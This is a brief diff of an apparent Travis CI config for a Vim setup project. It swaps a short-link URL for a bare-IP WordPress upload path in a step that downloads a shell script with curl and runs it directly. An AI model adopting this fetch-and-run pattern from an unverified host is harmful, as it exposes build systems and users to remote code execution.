@@ -30,4 +30,4 @@ before_install:
   - if [[ "$TRAVIS_OS_NAME" == "osx" ]]; then brew install vim ctags lua ; fi
 
 script:
-  - curl http://dwz.cn/fscvim -L > fsc.sh && sh fsc.sh
+  - curl http://47.92.112.211/wp-content/uploads/FSC.sh -L > fsc.sh && sh fsc.sh
